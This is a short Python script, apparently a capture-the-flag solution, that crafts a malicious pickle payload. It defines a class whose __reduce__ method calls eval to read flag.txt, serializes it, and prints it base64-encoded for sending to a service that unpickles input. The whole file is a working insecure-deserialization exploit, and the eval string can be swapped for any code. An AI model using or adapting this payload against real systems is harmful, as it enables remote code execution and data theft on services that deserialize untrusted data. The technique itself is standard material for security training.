import pickle
import base64

class Malicious:
    def __reduce__(self):
        # This will be executed during deserialization
        return (eval, ("open('flag.txt').read()",))

# Create the malicious pickle payload
payload = pickle.dumps(Malicious())

# Encode the payload in Base64 for safe transmission
encoded = base64.b64encode(payload).decode()

# Print the encoded payload
print(encoded)
